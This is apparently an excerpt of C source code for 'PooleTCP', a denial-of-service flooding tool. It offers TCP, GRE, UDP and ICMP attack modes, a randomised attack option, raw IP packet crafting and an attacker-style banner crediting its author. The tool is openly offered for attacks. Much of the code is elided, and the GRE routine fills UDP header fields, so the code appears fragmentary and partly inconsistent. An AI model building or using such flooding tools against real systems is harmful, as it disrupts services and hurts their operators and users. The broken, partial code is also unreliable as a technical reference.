// PooleTCP is a TCP-DoS that can perform all TCP requests
...
#define GRE_ATTACK()    (a_flags & GRE_CFF)
...
static void send_gre(u_char garbage);
...
main(int argc, char *argv[])
{
    ...
    while ( (n = getopt(argc, argv, "T:RGUINs:h:d:p:q:l:x:t:")) != -1) {
        char *p;
        switch (n) {
            case 'T':
                switch (atoi(optarg)) {
    ...
    if ( (!dstaddr && !i) ||
         (dstaddr && i) ||
         (!TCP_ATTACK() && !GRE_ATTACK() && !UDP_ATTACK() && !ICMP_ATTACK()) ||
...
{                      
    ...
    memset(&packet, 0, sizeof packet);
    inject_iphdr(&packet.ip, IPPROTO_GRE, FIX(sizeof packet));
    packet.ip.ip_sum            = in_cksum((void *)&packet.ip,0);
    packet.udp.uh_sport         = CHOOSE_SRC_PORT();
    packet.udp.uh_dport         = CHOOSE_DST_PORT();
    packet.udp.uh_ulen          = htons(sizeof(struct udphdr) + psize);
...
const char *banner = "\e[1;37m(\e[0m\e[0;31mPooleTCP\e[0m\e[1;37m)\e[0m-\e[1;37mby\e[0m-\e[1;37m(\e[0m\e[0;31mChris Poole\e[0m\e[1;37m)\e[0m";
static void
usage(const char *argv0)
{
	printf("%s \n", banner);
        ...
        printf("    -R Randomised attack                    \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
        printf("    -G GRE attck                            \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
